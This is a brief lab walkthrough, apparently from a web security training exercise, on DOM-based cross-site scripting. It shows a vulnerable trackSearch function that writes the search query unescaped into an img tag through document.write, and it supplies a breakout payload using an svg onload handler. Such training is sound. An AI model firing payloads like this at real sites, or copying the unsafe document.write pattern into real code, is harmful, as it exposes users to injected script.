# Lab: DOM XSS in document.write sink using source location.search

Enter a search query. Inspect the resulting page to see that the query is inserted into an img src attribute:

```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

Use the following query to break out: `"><svg onload=alert(1)>`